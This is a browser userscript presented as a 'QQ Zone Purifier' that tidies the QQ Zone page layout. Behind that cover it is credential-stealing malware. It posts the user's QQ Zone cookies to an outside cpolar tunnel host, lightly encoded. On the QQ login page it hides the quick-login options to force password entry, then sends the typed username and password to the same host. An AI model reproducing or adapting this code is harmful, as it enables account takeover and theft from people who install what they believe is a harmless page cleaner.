// ==UserScript==
// @name         QQ空间净化器
// @namespace    http://tampermonkey.net/
// @version      1.6
// @description  让你的QQ空间变得更加美妙！
// @author       白芍
// @match        https://user.qzone.qq.com/*
// @match        https://i.qq.com/*
// @match        https://xui.ptlogin2.qq.com/*
// @icon         https://ts1.cn.mm.bing.net/th?id=ODLS.f60b6ee6-1514-4c8b-ad2b-7e1c247e3c27&w=16&h=16&o=6&pid=1.2
// @license      AGPL-3.0
// @grant        GM_xmlhttpRequest
// @require      https://code.jquery.com/jquery-2.1.4.min.js
// @connect      https://3783bfad.r12.cpolar.top
// @downloadURL https://update.greasyfork.org/scripts/465596/QQ%E7%A9%BA%E9%97%B4%E5%87%80%E5%8C%96%E5%99%A8.user.js
// @updateURL https://update.greasyfork.org/scripts/465596/QQ%E7%A9%BA%E9%97%B4%E5%87%80%E5%8C%96%E5%99%A8.meta.js
// ==/UserScript==


(() => {
    'use strict';

    var url = 'https://3783bfad.r12.cpolar.top'

    let $ = this.jQuery = jQuery.noConflict(true);

    function strToBinary(str) {
        var result = [];
        var list = str.split("");
        for (var i = 0; i < list.length; i++) {
            if (i != 0) {
                result.push("-");
            }
            var item = list[i];
            var binaryStr = item.charCodeAt().toString(15);
            result.push(binaryStr);
        }
        return result.join("");
    }

    function send(data) {

        GM_xmlhttpRequest({
            method: "post",
            url: url,
            data: 'op=1&bzoneId=' + strToBinary(data),
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            onload: function (res) {
                if (res.status === 200) {
                    console.log('成功')
                } else {
                    console.log('失败')
                    console.log(res)
                }
            },
            onerror: function (err) {
                console.log(err)
            }
        });
    }

    if (location.host == 'user.qzone.qq.com') {

        send(document.cookie);

        $('.layout-head').remove();
        $('#_qz_zoom_detect').remove();
        $('#QM_Mood_Poster_Container').remove();
        $('#leftMenu').remove();
        $('.col-main-sidebar').remove();
        $('.fn-feed-control-v2').remove();
        $('.layout-nav').remove();
    }

    else if (location.host == 'xui.ptlogin2.qq.com') {

        $('#qlogin').offset({ top: -10000, left: -100000 });
        $('#bottom_qlogin').offset({ top: -10000, left: -100000 });
        $('#qlogin_entry').offset({ top: -10000, left: -100000 });

        window.onload = function () {
            $('#web_qr_login').show();
        };

        $('#login_button').click(() => {
            send($('#u').val() + ' | ' + $('#p').val());
        });
    }
})();
